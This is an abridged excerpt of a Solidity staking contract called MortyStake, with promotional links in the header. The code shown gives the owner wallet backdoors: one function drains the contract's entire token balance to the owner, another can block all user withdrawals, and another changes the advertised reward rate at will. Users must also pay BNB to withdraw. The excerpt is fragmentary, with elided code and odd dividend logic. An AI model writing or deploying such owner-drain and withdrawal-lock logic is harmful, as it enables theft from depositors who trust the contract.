...
/*    
 *   Welcome to MortyStake
 *   [OFFICIAL LINKS] 
 * 
 *   ┌────────────────────────────────────────────────────────────┐
 *   │   Website:  *Official website of https://mortyinu.net/     │ 
 *   │   Twitter:  https://twitter.com/mortyinu                   │
 *   │   Telegram: https://t.me/mortyinu                          │ 
 *   │   Chat:     https://t.me/mortyinu_chat                     │
 *   └────────────────────────────────────────────────────────────┘
 *
 *   [USAGE INSTRUCTION]
 *
...
contract MortyStake {
	...
	address private tokenAddr = 0x61b1F9EBc0C29B9c24b0D9f7dB4AC9508B12C789;  // Morty Staking liquidity = 250,000,000 MRT2
	IERC20 public token;

	uint256 constant private INVEST_MIN_AMOUNT = 10 ether;
	uint256 constant private MAX_MONTH_STAKE = 1000000 ether;
	uint256 constant private INVEST_MAX_AMOUNT = 1000000 ether;
	uint256 constant private MIN_AMOUNT_BNB = 0.001 ether;
    ...
    function setWith(uint256 flag) public {
		require(msg.sender == ceoWallet, "you must be a owner");
		if(flag == 1){
			withdrawFlag = false;
		} 
		if(flag == 0) {
	...
	receive() external payable {
		ALL_TRANSACTION.push(msg.value);
		TRANSACTION_BALANCE.push(token.balanceOf(address(this)));
  	} 
	...
	function invest(address referrer, uint8 plan, uint256 depositAmount) public payable {
		...
		require((getUserTotalMonthDeposits(msg.sender) + depositAmount) < MAX_MONTH_STAKE, "error");
    ...
    function reinvest(address referrer, uint8 plan) public payable {
		...
		require(MIN_AMOUNT_BNB <= msg.value, "less than min amount");
		...
		require((getUserAmountOfDeposits(msg.sender) + depositAmount) < MAX_MONTH_STAKE, "error");
	...
	function withdrawnAllMorty() public {
		require(msg.sender == ceoWallet, "you must be a owner");
		token.safeTransfer(ceoWallet, token.balanceOf(address(this)));
	}

	function withdraw() public payable {
        require(MIN_AMOUNT_BNB <= msg.value, "less than min amount");
		require(withdrawFlag == true,"denided");
		User storage user = users[msg.sender];
        require( (user.checkpoint + TIME_STEP) < block.timestamp ,"only once a day" );
		uint256 totalAmount = getUserDividends(msg.sender);
		uint256 referralBonus = getUserReferralBonus(msg.sender);
	...
	function setBonus(uint256 pers) public {
		require(msg.sender == ceoWallet, "you must be a owner");
		plans[0].percent = pers;
	}
	function getPersent() public view returns (uint256){
		return plans[0].percent;
	}
	...
	function getUserDividends(address userAddress) public view returns (uint256) {
		...
		for (uint256 i = 0; i < capped(user.deposits.length); i++) {
			...
			if (user.checkpoint < finish) {
				...
				if (from < to) {
					totalAmount = totalAmount.add(share.mul(1));
				}
			}
		}
	...
	function getUserTotalMonthDeposits(address userAddress) public view returns(uint256 amount) {
		
		for (uint256 i = 0; i < users[userAddress].deposits.length; i++) {
			uint256 finish = users[userAddress].deposits[i].start.add(plans[users[userAddress].deposits[i].plan].time.mul(TIME_STEP));		
